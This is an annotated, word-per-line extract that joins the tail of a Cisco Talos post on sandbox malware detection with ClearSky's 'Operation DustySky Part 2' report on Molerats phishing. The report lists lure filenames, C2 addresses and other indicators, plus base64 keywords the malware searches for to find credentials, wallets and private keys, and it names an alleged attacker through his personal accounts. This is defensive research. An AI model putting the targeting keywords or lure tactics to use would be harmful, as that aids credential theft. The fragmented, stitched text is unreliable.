003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9  B_hash
2015-02-17

MALICIOUS

EQUATION  B_malware.unknown
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash
2014-12-20

UNKNOWN

ARID  B_malware.unknown
VIPER I
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash
2014-12-20

malicious

ARID  B_malware.unknown
VIPER I
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash
2015-01-02

MALIICIOUS

ARID  B_malware.unknown
VIPER I
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash
2015-01-16

malicious

ARID  B_malware.unknown
VIPER I
2015-02-12
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash

malicious

ARID  B_malware.unknown
VIPER I

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
14BFDA4A4ACA1276388702D0FB7629AF120FF34C1ACDEB7613815F2981C99832  B_hash
2014-05-07

malicious

BRUTPOS B_malware.unknown
508909C8A00026C904F52099DD62BBF4062B4E8E40FC0601BD9E13570514B4F5  B_hash
2014-05-06

malicious

BRUTPOS B_malware.unknown
7170A07BCB5B0467A75CBD17A1A1877AEC3C8EA43C45D3BED6AB5E6C95A62713  B_hash
2014-05-06

malicious

BRUTPOS B_malware.unknown
9A10916AD0F43FA3376C2E54FD5CFDD06D684B3A19895ED4107FAF9F3313DCDA  B_hash
2014-05-07

malicious

BRUTPOS B_malware.unknown

E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F  B_hash
2014-05-06

UNKNOWN

BRUTPOS B_malware.unknown

E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F  B_hash
2014-05-07

malicious

BRUTPOS B_malware.unknown

Based
on
our
logs
,
Cisco
AMP
found
the
sample
015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751  B_hash
twice
on
2015-12-20
.

It
was
'
unknown
'
to
AMP
the
 rst
time
,
but
detected
as
malicious
the
second
time
.

E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F  B_hash
was
'
unknown
'
to
AMP
on
2014-05-06
,
but
detected
as
malicious
the
next
time
it
was
seen
on
a
customer's
machine
on
2014-05-07
.

In
all
the
other
cases
the
samples
were
already
considered
malicious
.

CONCLUSION

As
the
number
of
threats
per
day
continues
to
increase
,
the
number
of
malware
samples
security
companies
automatically
analyze
increases
.

Much
of
the
analysis
is
comprised
of
dynamic
analysis
systems
,
such
as
sandboxes
,
to
determine
whether
the
sample
is
malicious
or
not
.

These
samples
are
then
stored
for
further
analysis
.

Due
to
the
large
numbers
of
samples
,
in
many
organizations
the
vast
majority
of
these
samples
remain
categorized
solely
on
the
initial
sandbox
run
.

Even
when
these
samples
are
shared
among
companies
or
via
other
services
like
VirusTotal
some
malware
samples
can
go
unnoticed
for
months
because
they
are
marked
as
malware
but
given
some
generic
name
,
such
as
'
Win.Trojan.Agent
'
.

Then
we
are
shocked
when
a
security
company
discovers
an
APT B_malware.unknown
campaign  I
that
has
supposedly
gone
unnoticed
for
years
.

The
results
of
this
post
confirm
the
assumption
of
the
Usenix
paper
,
also
based
on
a
dataset
of
a
big
security
company
and
similar
results
are
expected
throughout
the
security
industry
.

Many
times
,
malware
is
initially
submitted
to
sandbox
systems
and
marked
as
malicious
based
on
the
output
of
the
sandbox
.

Then
the
authors
use
that
information
to
tweak
the
sample
to
avoid
detection
in
future
sandbox
runs
through
various
evasion
tactics
.

In
other
situations
,
the
initial
sample
may
not
even
be
agged
as
malicious
due
to
evasion
techniques
being
utilized
.

By
performing
statistical
analysis
and
reducing
the
data
through
clustering
,
even
samples
that
avoid
initial
sandbox
detection

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
reducing
the
data
through
clustering
,
even
samples
that
avoid
initial
sandbox
detection
can
potentially
be
detected
as
malicious
.

There
is
clearly
a
need
for
more
advanced
analytical
systems
to
identify
campaigns
and
link
the
samples
together
.

Identifying
today's
threats
requires
multiple
layers
of
protection
at
various
points
across
the
network
,
along
with
constantly
updated
threat
intelligence
information
.

Cisco
analyzes
a
massive
amount
of
telemetry
data
and
is
able
to
 ag
malware
as
malicious
based
on
multiple
factors
.

By
performing
manual
and
programmatic
analysis
of
sandbox
data
in
conjunction
with
identifying
behaviors
which
are
associated
with
malicious
activity
,
even
unknown
APT B_malware.unknown
campaigns I
can
be
neutralized
.

P
O
S
T
E
D
B
Y
E
A
R
L
C
A
R
T
E
R
AT
1
1
:
0
3
A
M

L
A
B
E
L
S
:
A
P
T
,
C
A
M
P
A
I
G
N
,
M
A
LW
A
R
E
,
TA
L
O
S
,
W
H
I
T
E
P
A
P
E
R

S
H
A
R
E
T
H
I
S
P
O
S
T

NO
COMMENTS
:

POST
A
COMMENT

Enter
your
comment
...

Comment
as
:
Unknown
(
Google
)

Publish

Preview

Sign
out

Notify
me

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack

N
E
W
E
R
P
O
S
T

H
O
M
E

O
L
D
E
R
P
O
S
T

Search

S
U
B
S
C
R
I
B
E
T
O
:
P
O
S
T
C
O
M
M
E
N
T
S
(
AT
O
M
)

S
E
A
R
C
H
T
H
E
B
L
O
G

S
U
B
S
C
R
I
B
E
T
O
O
U
R
F
E
E
D

Posts

Comments

B
L
O
G
A
R
C
H
I
V
E
▼
2
0
1
6
(
21
)
►
A
P
R
I
L
(
4
)
►
M
A
R
C
H
(
7
)
►
F
E
B
R
U
A
R
Y
(
6
)
▼
J
A
N
U
A
R
Y
(
4
)

Bypassing
MiniUPnP
Stack
Smashing
Protection

Research
Spotlight
:
Needles
in
a
Haystack

Microsoft
Patch
Tuesday
-
January
2016

Rigging
compromise
-
RIG
Exploit
Kit
►
2
0
1
5
(
62
)
►
2
0
1
4
(
67
)
►
2
0
1
3
(
30
)
►
2
0
1
2
(
53
)
►
2
0
1
1
(
23
)

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
►
2
0
1
0
(
94
)
►
2
0
0
9
(
146
)
►
2
0
0
8
(
38
)

R
E
C
O
M
M
E
N
D
E
D
B
L
O
G
S

C
I
S
C
O
B
L
O
G

Cisco
Digital
Ceiling
:
Enhanced
Learning
through
Technology
and
Digitization

S
N
O
R
T
B
L
O
G

Snort
Subscriber
Rule
Set
Update
for
04/08/2016

C
L
A
M
A
V
®
B
L
O
G

ClamAV
Community
Signature
contest
winner
for
March
,
2016

Software

Community

Vulnerability
Reports

Additional
Resources

Microsoft
to
SID
Mapping
Archive

Shared
Object
Rule
Generator

IP
Blacklist
Download

AWBO
Exercises

About
Talos

Join
Our
Team

Contact

Blog

CONNECT
WITH
US

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
©
2015
Cisco
Systems
,
Inc
.
and/or
its
affiliates
.
All
rights
reserved
.
View
our
Privacy
Policy
here
.
June
2016

Operation
DustySky B_malware.drop

Part
2

ClearSky
Cybersecurity
www.clearskysec.com/DustySky2 B_url.normal

TLP:White

For
public
distribution
______________________________________________________________________________

Contents

Foreword
..............................................................................................................................................................
3

Acknowledgments
.......................................................................................................................................
3

Background
...........................................................................................................................................................
4

Targeting
and
incidents
........................................................................................................................................
5

Who
are
they
after
?
.........................................................................................................................................
5

Targeting
in
Hebrew
and
English
.................................................................................................................
5

Targeting
in
arabic
.......................................................................................................................................
9

What
are
they
after
?
......................................................................................................................................11

Infrastructure......................................................................................................................................................13

Key
C2
and
delivery
servers
.......................................................................................................................13

Threat
actor
and
Attribution
..............................................................................................................................15

Threat
actor
...............................................................................................................................................15

Who
is
moayy2ad@hotmail.com  B_url.normal
..............................................................................................................16

Contacting
ClearSky........................................................................................................................................22

By
Email
......................................................................................................................................................22

By
phone
....................................................................................................................................................23

Appendix
A
–
Indicators
......................................................................................................................................24
______________________________________________________________________________
(
C
)

Foreword

This
report
is
a
follow-up
on
our
DustySky B_malware.drop
operation
report
from
January
20161
.
It
analyses
new
attacks
by

Molerats
against
targets
in
Israel
,
The
United
States
,
Egypt
,
Saudi
Arabia
,
United
Arab
Emirates
and
The

Palestinian
Authority
.

We
elaborate
on
the
scope
and
targeting
of
the
DustySky B_malware.drop
campaign
and
expose
new
infrastructure
and
incidents
.

In
addition
,
we
expose
the
identity
of
an
individual
who
is
behind
the
DustySky B_malware.drop
campaign
.

Following
the
previous
report
,
this
individual
has
contacted
us
trying
to
learn
what
we
know
about
him
.

Attacks
against
all
targets
in
the
Middle
East
stopped
at
once
,
after
we
published
our
first
report
.

However
,
the
attacks
against
targets
in
the
Middle
East
(
except
Israel
)
were
renewed
in
less
than
20
days
.

In
the
beginning
of
April
2016
,
we
found
evidence
that
the
attacks
against
Israel
have
been
renewed
as
well2
.

Based
on
the
type
of
targets
,
on
Gaza
being
the
source
of
the
attacks
,
and
on
the
type
of
information
the
attackers
are
after
-
we
estimate
with
medium-high
certainty
that
the
Hamas
terrorist
organization3
is
behind
these
attacks
.

Acknowledgments

This
research
was
facilitated
by
the
PassiveTotal
for
threat
infrastructure
analysis
.

We
would
like
to
thank
the
security
researchers
and
organizations
who
shared
information
and
provided
feedback
,
which
have
been
crucial
for
this
research
.
1
clearskysec.com/DustySky B_malware.drop
2
The
report
seems
to
have
indeed
disrupted
the
attacker
for
several
months
.

In
a
PDB
found
in
a
sample
from
the
April
wave
,
there
is
an
indication
that
the
attacker
saw
that
wave
as
'
part
2
'
of
the
attacks
(
part
1
being
the
attacks
before
the
public
report
)
:
Name
D:\IL\Working
Tools\2016-04-23
NeD
Ver
9
Ran
Il
-
192.52.167.118\NeD  B_ip.normal
Download
and
execute
Version
1
-
Doc\bin\Release\Obfuscated\News.pdb
3
https://www.nctc.gov/site/groups/hamas.html B_url.normal
______________________________________________________________________________
(
C
)


Background

DustySky B_malware.drop
is
a
multi-stage
malware
written
in
.NET
(
recently
ported
to
C++
)
.

It
is
composed
of
a
DustySky B_malware.drop
dropper
,
DustySky B_malware.drop
core
,
and
the
DustySky B_malware.drop
keylogging
component
.
It
has
been
developed
and
used
since
May
2015
by
Molerats
(
aka
'
Gaza
cybergang
'
)
,
a
terrorist
group
whose
main
objective
in
this
campaign
is
intelligence
gathering
.

A
wave
of
malicious
email
messages
has
been
sent
on
a
weekly
basis
to
hundreds
of
targets
.
The
email
message
and
the
lure
documents
are
written
in
Hebrew
,
Arabic
or
English
.

The
attackers
would
send
a
malicious
email
message
that
either
links
to
an
archive
file
(
RAR
or
ZIP
compressed
)
or
has
one
attached
to
it
.

The
archive
contains
an
.exe
file
,
sometimes
disguised
as
a
Microsoft
Word
file
,
a
video
,
or
another
file
format
,
using
the
corresponding
icon
.

We
have
also
found
samples
that
use
Microsoft
Word
files
embeded
with
a
malicious
macro
,
which
would
infect
the
victim
if
enabled
.

In
all
cases
the
attackers
rely
on
social
engineering
-
convincing
the
victim
to
open
the
file
(
and
enabling
content
if
it
is
disabled
)
-
and
not
on
software
vulnerabilities

In
addition
to
DustySky B_malware.drop
,
the
attackers
use
publicly
available
tools
such
as
the
following
Remote  B_malware.unknown

Administration
Tools
(
RAT
)
:
Poison  B_malware.unknown
ivy I
,
Nano  B_malware.unknown
Core  I
,
XtremeRAT B_malware.backdoor
,
DarkComet B_malware.unknown
and
Spy-Net B_malware.unknown
.
These
tools
have
been
used
either
following
an
initial
DustySky B_malware.drop
infection
,
or
by
themselves
.

Targeted
sectors
are
mostly
governmental
and
diplomatic
institutions
including
embassies;
companies
from
the
aerospace
and
defense
Industries;
financial
institutions;
journalists;
software
developers
.

Most
targets
are
from
the
Middle
East
,
some
are
in
the
United
States
and
Europe
.

In
January
2016
we've
published
an
extensive
report
about
the
campaign
and
malware
-
'
Operation

DustySky B_malware.drop
'
-
which
is
available
here
:
clearskysec.com/DustySky B_malware.drop
______________________________________________________________________________
(
C
)

Targeting
and
Incidents

Who
are
they
after
?

Targeting
in
Hebrew
and
English

Below
are
examples
of
lure
documents
presented
to
the
victim
while
the
malware
infects
the
computer
.

The
content
of
the
document
is
always
copied
from
an
online
public
source
.

The
subject
usually
revolves
around
defense
and
security
or
current
affairs
.

Once
in
a
while
other
topics
or
content
are
used
-
such
as
a
public
corporate
responsibility
document
published
by
Egged
,
an
Israeli
bus
company;
a
part
of
an
online
Novel
published
as
a
doc
file;
or
pornographic
materials
.

Intelligence
agencies
succeeding
in
penetrating
Hezbollah.exe

IDF
survey
Research
Center
______________________________________________________________________________
(
C
)

Page
5
of
26
unused
condom
(
שמושמ
אל
םודנוק

Live
Webcam
For
Free
תיאשמו
סובוטוא
תושגנתהב
םיעוצפ
כו-15
םיגורה
השיש
.exe
(
Six
killed
and
15
wounded
in
an
collision
between
bus
and
tractor
trailer
)
______________________________________________________________________________
(
C
)

Page
6
of
26

Intelligence
Report
:
Israel's
strategic
position
has
improved.exe
-
דגא
תומייקו
תידיגאת
תוירחא
חוד
.exe
(
corporate
responsibility
and
sustainability
report
-
Egged
)
-קרפ
ז
םירוויעל
הבהא
קחשמ
'
.exe
(
blind
love
game
–
chapter
G
)
______________________________________________________________________________
(
C
)

Page
7
of
26

Ynet
news

In
a
recent
wave
,
a
bit.ly
link
(
https://bitly[.]com/1YRoIPX
)
was
used
instead
of
a
direct
link
to
the
malware
(
bit.ly
is
a
legitimate
URL
shortening
service
)
.

The
shortened
link
statistics
page
enables
us
to
learn
about
the
scope
and
the
targeting
of
this
threat
actor
.

We
can
see
that
the
link
was
clicked
210
times
,
out
of
which
130
were
in
Israel
,
32
in
the
United
States
,
9
in
the
Palestinian
authority
,
and
39
from
12
other
countries
(
1-5
each
)
.

The
statistics
do
not
necessarily
reflect
the
exact
distribution
of
targets
:
one
target
may
click
more
than
one
time;
a
proxy
or
VPN
may
skew
the
country
count;
and
security
researchers
and
bots
may
also
comprise
part
of
the
clicks
.

However
,
they
do
roughly
represent
the
scope
of
the
campaign
:
tens
to
few
hundreds
of
recipients
-
mostly
in
Israel
,
the
United
States
and
the
Palestinian
Territories
.

This
corresponds
to
the
distribution
we
know
of
based
on
other
sources
such
as
direct
reports
from
targets
,
cases
we
have
investigated
,
and
open
source
intelligence
.
______________________________________________________________________________
(
C
)

Page
8
of
26

Targeting
in
arabic

Below
are
examples
of
a
document
and
a
malicious
email
,
targeting
Arabic
speaking
victims
.

يمويلا
تارباخملا
ريرقت
صخلم
(
Summary
daily
intelligence
report
)
برقعلا
ليعامسإ
ديرف
يدايقلا
تومل
ةيقيقحلا
ةصقلا
.exe
(
The
true
story
behind
the
death
of
the
leader
Farid
Ismail
in
Scorpio
prison
)

When
targeting
Arab-speaking
counties
,
most
targets
are
in
Egypt
,
Saudi
Arabia
,
The
Palestinian
authority
and
United
Arab
Emirates
.

We
have
learned
of
more
than
150
targets
in
these
countries
when
investigating
a
breached
email
account
used
by
the
attackers
to
send
further
malicious
emails
.

About
60%
of
targeted
the
email
addresses
where
Gmail
,
Hotmail
and
Yahoo
accounts
.

The
rest
of
the
email
accounts
were
in
organizations
-
both
private
and
governmental
.
______________________________________________________________________________
(
C
)

Page
9
of
26

We
searched
for
information
about
the
targets
in
order
to
learn
the
interests
of
the
attackers
.

Below
are
examples
of
targeted
individuals
and
organizations
:


Several
diplomats
and
employees
of
the
ministry
of
foreign
affairs
in
Egypt
(
20
emails
addresses
at
mfa.gov.eg
,
investment.gov.eg
and
other
offices
)
.


Egypt's
Ambassador
in
the
Ukraine
,
Counsellor
of
Permanent
Mission
of
Egypt
to
the
United
Nations
,
the
Egyptian
Embassy
in
New
Zealand
,
and
Egyptian
Embassy
in
Pakistan
.


An
individual
at
the
prime
minister's
office
at
the
Palestinian
Authority
(
both
his
Gmail
account
and
an
account
under
pmo.pna.ps
)
.

A
senior
official
at
the
Birzeit
University
in
the
Palestinian
Authority
.


A
consultant
at
West
Bank
and
Gaza
Group
,
The
World
Bank
(
worldbank.org
)
.

Israeli
banks
.

Israeli
military
and
defense
companies
.

Ministry
of
Foreign
Affairs
of
Saudi
Arabia
(
2
email
addresses
at
mofa.gov.ae
)
.


Ministry
of
Foreign
Affairs
of
United
Arab
Emirates
(
2
email
addresses
at
mofa.gov.sa
)
.


A
banks
in
Dubai
and
Abu
Dhabi
,
United
Arab
Emirates
.


A
Lobbying
organizations
in
the
UK
.


Former
politician
in
the
UK
.


A
diplomat
the
European
Commission
(
ec.europa.eu
)
.


The
Royal
Hashemite
Court
in
Jordan
(
rhc.jo
)
.


An
employee
at
the
U.S.
Department
of
State
(
state.gov
)
.
______________________________________________________________________________
(
C
)

Page
10
of
26

What
are
they
after
?

The
malware
scans
the
computer
for
files
that
contain
certain
keywords
.

The
list
of
keywords
,
in
base64
format
,
is
retrieved
from
the
command
and
control
server
as
a
text
file
.

For
example
:

These
words
indicate
what
information
the
attackers
are
after
-
information
pertaining
to
homeland
security
and
military
issues;
personal
documents;
credentials
,
certificates
and
private
keys
.

Below
are
keywords
that
have
been
used
in
the
recent
campaigns
:

Baste64

Decoded

English
translation

ZW1haWxz

YWNjb3VudHM=

Yml0Y29pbg==

Y3YuZG9j

Y3YucGRm

TG9naW4gRGF0YQ==

S2V5V29yZA==

LndhbGxldA==

LnBmeA==

Lm92cG4=

Emails

Accounts

Bitcoin
cv.doc
cv.pdf

Login
Data

KeyWord
.wallet
.pfx
.ovpn
dXNlcnMgbmFtZSBhbmQgcGFzc3dvcmQ=
users
name
and
password
dG9yLmRvYw==
cGFzc3dvcmRz
cGF5cGFs
bG9naW5zLg==
bG9naW5z
aWQucGRm
aWQuanBn
tor.doc
passwords
paypal
logins
.
logins
id.pdf
id.jpg
______________________________________________________________________________
(
C
)

2YXYrtin2KjYsdin2Kog
2YXYrdi22LEg2KfYrNiq2YXYp9i5
2YPZhNmF2KfYqiDZhdix2YjYsQ==
2YPZhNmF2KfYqiDYs9ix
2YPZhNmF2KfYqiDYp9mE2YXYsdmI2LE=
2YPZhNmF2KfYqiDYp9mE2LPYsQ==
2YPZhNmF2KfYqiDYp9mE2LPYsQ==
2YLYp9i52K/YqSDYqNmK2KfZhtin2Ko=
2YjYq9mK2YLYqQ==
2LPZitix2Kkg2LDYp9iq2YrYqQ==
2LPZitiq2Kcg
2LnYs9mD2LHZiiA=
2KPZhdmG2Yog
2KfZhNil2YrZhdmK2YTYp9iq
2KfYs9iq2K7YqNin2LHYp9iq
تارباخم
عامتجا
رضحم
رورم
تاملك
رس
تاملك
رورملا
تاملك
رسلا
تاملك
رسلا
تاملك
تانايب
ةدعاق
ةقيثو
ةيتاذ
ةريس
اتيس
يركسع
ينمأ
تلايميلإا
تارابختسا
16rXldeb16DXmdeV16og16bXkdeQ15nXlde
16rXldeb16DXmdeV16o=
16nXkScn15s=
תויאבצ
תוינכות
תוינכות
כ'בש

Intelligence
meeting
protocol
passwords
passwords
the
passwords
the
passwords
the
passwords

Database
document

SITA
(
www.sita.aero
)
military
defense
or
security
related
the
emails
intelligence
military
plans
plans

Shabak
(
Israel
Security
Agency
)
16jXkNepINeU157Xntep15zXlA==
הלשממה
שאר
prime
minister
16HXmdeh157XkNeV16o=
16HXmdeh157XkA==
16HXldeTLg==
תואמסיס
אמסיס
16DXntec15nXnSDXp9eo15HXmded
םיברק
םילמנ
16bXkdeQ15nXldeq
16bXkdeQ15k=
15TXldeT16LXldeq
תויאבצ
יאבצ
תועדוה
passwords
password
secret
combat
sea
ports
military
related
military
related
messages
15nXl9eZ15PXlCAg157XmdeV15fXk9eq
תדחוימ
הדיחי
special
forces
unit
15jXmdeh15nXnQ==
15HXmdeY15fXldeg15nXnQ==
15DXkdeY15fXlA==
157XqdeqJyfXpA==
םיסיט
םינוחטיב
החטבא
פ'תשמ
157Xqdeo15Mg15TXpNeg15nXnQ==
םינפה
דרשמ
pilots

Defense
and
security
related
security
collaborator
(
a
person
who
cooperates
with
the
enemy
)
ministry
of
internal
affairs
157XoNeU16jXldeq
157XoNeU16jXlA==
157Xlicn15zXmA==
157XldeT16LXmdef
157XldeT15nXoteZ158=
157Xldeh15Mg
תורהנמ
הרהנמ
ט'לזמ
ןיעדומ
ןיעידומ
דסומ
tunnels
tunnel
drone
intelligence
intelligence

Mossad
______________________________________________________________________________
(
C
)

Infrastructure

As
in
previous
cases
,
the
attackers
still
serve
copied
content
on
IPs
,
domains
and
hosts
they
control
.

For
example
,
one
of
the
command
and
control
servers
,
mafy.2waky[.]com
,
serves
content
copied
from
a
legitimate
unrelated
website
-
radaronline.com B_url.unknown
.

The
copied
content
is
probably
there
just
to
confuse
suspecting
targets
and
security
researchers
.

In
other
cases
,
the
visitor
was
redirected
via
HTTP
301
response
to
a
legitimate
unrelated
website
www.onlinepcsupport.co.uk B_url.normal
.

Key
C2
and
delivery
servers

The
attackers
have
been
using
IP
address
192.52.167.118  B_ip.unknown
since
the
beginning
of
January
.

In
the
Heat
map
below
,
we
can
see
that
new
hosts/domains
(
marked
by
orange
triangle
)
have
pointed
to
it
during
January-

February
and
again
in
May
.
______________________________________________________________________________
(
C
)

Source
:
https://www.passivetotal.org/passive/192.52.167.118 B_url.normal

IP
address
204.152.203.99   B_ip.unknown
is
newer
and
has
been
in
use
since
May
:

Source
:
https://www.passivetotal.org/passive/204.152.203.99 B_url.normal

Below
are
the
active
IPs
used
for
command
and
control
or
for
delivery
:
204.152.203.99  B_ip.unknown

ASN
and
Hosting
provider

United
States
Los
Angeles
Graeme
Tee
,
QuadraNet
192.161.48.59 B_ip.unknown

United
States
Los
Angeles
Graeme
Tee
,
QuadraNet
192.52.167.118  B_ip.unknown

United
States
Burns
Crowncloud
Us
Llc
,
Crowncloud
US
LLC
185.82.202.207  B_ip.unknown

Netherlands
Amsterdam
Host
Sailor
Ltd
.
173.254.236.130 B_ip.unknown

United
States
Los
Angeles
Graeme
Tee
,
QuadraNet
,
Inc
168.235.86.156  B_ip.unknown

United
States
Macon
Ramnode
Llc
167.160.36.101  B_ip.unknown

United
States
Lewes
Gwy
It
Pty
Ltd
,
Web2Objects
LLC
107.191.47.42 B_ip.unknown

United
States
Tampa
Vultr
Holdings
Llc
,
Choopa
,
LLC
84.200.68.163 B_ip.unknown

Germany
Freinsheim
Ip
Projects
,
IP-Projects
GmbH
&
Co
.
KG
72.11.148.147 B_ip.unknown

United
States
Los
Angeles
QuadraNet
Inc
23.229.3.70 B_ip.unknown

Turkey
Istanbul
Turkrdns.com
,
B2
Net
Solutions
Inc

Further
indicators
are
provided
in
Appendix
A
.
______________________________________________________________________________
(
C
)

Threat
Actor
and
Attribution

The
DustySky B_malware.drop
campaign
has
been
going
on
for
over
a
year
,
with
more
than
120
command
and
control
hostnames
,
and
dozens
of
known
unique
malware
samples
.
However
,
it
has
not
been
technologically
advanced
,
and
the
infrastructure
and
attacks
have
not
been
operated
professionally
.

Open
directories
were
often
left
on
delivery
servers
.

Traces
were
left
on
infected
systems
and
abused
email
accounts
.

Malware
delivery
was
often
predictable
,
contained
spelling
mistakes
or
even
irrelevant
lure
documents
,
and
were
easy
to
identify
.

Most
importantly
,
the
attacker
forgot
to
cover
his
trails
,
enabling
us
to
learn
his
identity
.

Threat
actor

In
the
beginning
of
December
2015
,
three
samples
were
submitted
to
online
malware
detection
and
analysis
platforms
malwr.com B_url.normal
and
Virus
Total
.

The
samples
were
Word
documents
with
a
macro
version
of
DustySky B_malware.drop
.

They
were
submitted
on
the
same
date
they
were
last
saved
.

The
person
who
last
saved
the
documents
(
after
weaponizing
them
with
the
malicious
macro
)
forgot
to
clear
the
file
metadata
.

Thus
,
the
'
Last
Saved
By
'
properties
of
the
documents
contained
his
username
:
moayy2ad@hotmail.com  B_url.normal

The
images
below
display
this
username
in
the
samples
metadata
:

Invoice
details.doc
(
b1071ab4c3ef255c6ec95628744cfd3d  B_hash
)
,
uploaded
on
3
December
20154
and
Invoice-Complete.doc
(
77d6e2068bb3367b1a46472b56063f10  B_hash
)
uploaded
on
2
December
20155
4
https://malwr.com/analysis/Yjc4YjVjYmNjYzVjNGE2MzhkMTc1OWJjMjdjNjExNWU/ B_url.normal
5
https://malwr.com/analysis/NmU4MjcxYjYwZmQ1NDk4YmI5NjI3MDMzMDM2N2E1ZTY/ B_url.normal
______________________________________________________________________________
(
C
)

Google-Privacy.doc
(
9c60fadece6ea770e2c1814ac4b3ae74  B_hash
)
uploaded
to
VirusTotal
on
3
December
20156

Who
is
moayy2ad@hotmail.com  B_url.normal

The
unique
username
moayy2ad
enabled
us
to
find
plenty
of
information
on
the
attacker
.
Googling
for
moayy2ad@hotmail.com  B_url.normal
led
the
following
blog7
,
which
has
been
removed
in
the
months
after
we
published
the
first
report
:
6
https://www.virustotal.com/en/file/f96f07288039ebabb8d837043f06f8f1445ed4484023353e1111a40ac4f25fd8/analysis /  B_url.normal
7
mrayesh.blogspot[.]com  B_url.normal
______________________________________________________________________________
(
C
)

The
blog
was
created
by
mo'ayyad
on
Blogger
,
who
is
also
using
the
name
mo'ayy
.
This
profile
has
been
made
private
following
our
publication
.

Searching
for
the
same
username
in
Gmail
(
moayy2ad@gmail.com  B_url.normal
)
yielded
further
results
.
A
Google+
profile8
with
a
similar
nickname
–
Mo'ay
-
was
connected
to
this
address
.
The
profile
has
also
been
disabled
in
the
months
after
we
published
the
first
report
.
8
https://plus.google.com/u/1/115033746922297164649 B_url.normal
______________________________________________________________________________
(
C
)

The
owner
of
the
Gmail
account
has
developed
a
flashlight
app9
.
In
the
app's
page
we
learn
that
he
uses
the
name
Mo'ayyad
Ay
and
that
he
is
from
Gaza
'

In
the
YouTube
channel10
linked
to
moayy2ad@gmail.com  B_url.normal
(
which
,
like
the
other
accounts
,
has
been
made
private
later
)
,
the
individual
has
uploaded
anti-Israeli
propaganda
videos
:
9
https://play.google.com/store/apps/details?id=org.moayyad.aye.flash.app&hl=en B_url.normal
10
https://www.youtube.com/user/1quds/feed B_url.normal
______________________________________________________________________________
(
C
)

According
to
the
videos
he
watched
it
seems
that
he
was
learning
development
and
hacking
skills
over
the
past
few
years
:
______________________________________________________________________________
(
C
)

Similarly
,
we
found
his
Twitter
account11
(
also
disabled
)
full
name
Moayyad
Ayesh
and
Facebook
account12
11
https://twitter.com/MoayyadAyesh  B_url.normal
12
https://www.facebook.com/profile.php?id=100012034095150 B_url.normal
______________________________________________________________________________
(
C
)

We
also
found
this
cached
chat
in
Tor
based
chat
service
in
which
moayy2ad
is
talking
about
'
israil  B_malware.unknown
bnk I
acounts
'
(
we
do
not
have
the
rest
of
the
conversation
)
.
______________________________________________________________________________
(
C
)

The
Gmail
address
is
connected
to
a
Facebook
account
,
probably
of
a
fake
identity
-
Montaser
Ali
(
https://www.facebook[.]com/montaser.ali.338 B_url.unknown

)
.

The
profile
says
that
the
actor
resides
in
Nablus
,
and
that
he
is
a
member
of
a
group
called
'
Rebellion
–

West-Bank'13
.

Contacting
ClearSky

In
the
first
DustySky B_malware.drop
report
,
we
mentioned
we
know
the
identity
of
the
attacker
,
but
have
decided
not
to
reveal
it
.
Consequently
,
the
attacker
contacted
us
,
trying
to
learn
what
we
know
about
him
.

By
Email

Eleven
days
after
we
publicly
published
'
Operation
DustySky B_malware.drop
'
,
we
received
the
following
email
13
https://www.facebook.com/%D8%AA%D9%85%D8%B1%D8%AF-%D8%A7%D9%84%D8%B6%D9%81%D8%A9%D8%A7%D9%84%D8%BA%D8%B1%D8%A8%D9%8A%D8%A9-542062199177072/ B_url.normal
______________________________________________________________________________
(
C
)

We
immediately
recognized
the
email
as
a
fake
–
coming
from
an
unofficial
address
-
idf.cyber@gmail.com B_url.unknown
–
and
written
in
English
.

The
email
,
allegedly
sent
by
the
'
Israeli
Defense
Force
cyber
team
'
,
asked
for
undisclosed
information
we
had
about
the
culprit
behind
DustySky B_malware.drop
(
the
email
referred
to
a
statement
in
the
first
report
in
which
we
wrote
that
'
we
have
decided
not
to
disclose
this
individual's
name
in
the
public
report
'
)
.

By
phone

Few
days
later
,
we
were
contacted
again
,
this
time
by
phone
.
The
caller
pretended
to
be
an
official
in
one
of
the
effected
countries
mentioned
in
the
report
.

Similarly
,
he
asked
for
further
information
about
the
identity
of
the
attacker
.

We
asked
the
caller
to
send
his
request
via
email
.

Corroborating
the
provided
contact
information
,
we
learned
that
this
was
also
a
fake
.

In
both
cases
,
we
did
not
send
any
information
to
the
attackers
.

However
,
we
used
the
new
leads
to
deepen
the
investigation
.

Below
is
the
email
we
received
:
______________________________________________________________________________
(
C
)

Appendix
A
–
Indicators

Type
indicator

AV
detection

Win.Trojan.DustySky B_malware.drop

AV
detection

Trojan.Dustky

AV
detection

Trojan.MSIL.Musik
domain
domain
domain
domain
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
hostname
sender
sender
sender
education-support.space
falcondefender.com
support-update.ml
such.market
support.mafy-koren.online
mafy.2waky.com
smail.otzo.com
ad.education-support.space
info.education-support.space
support.servecounterstrike.com
reme.otzo.com
supports.esmtp.biz
news.cloudns.cc
speed.ns01.biz
space.support-reg.space
mo.mefound.com
support.read-books.org
supports.3utilities.com
84.200.68.163 B_ip.unknown
23.229.3.70 B_ip.unknown
204.152.203.99  B_ip.unknown
192.52.167.118  B_ip.unknown
168.235.86.156  B_ip.unknown
167.160.36.101  B_ip.unknown
'
Free
Movies
'
<Movie@mafy-koren.online>
'
IDF
Survey
Research
Center
..
'
<info@mafy-koren.online>
avynorton@gmail.com
59bab785127418972dda9da5571b73fd  B_hash
07dae7dada9ec3fa22507dfa5921c993  B_hash
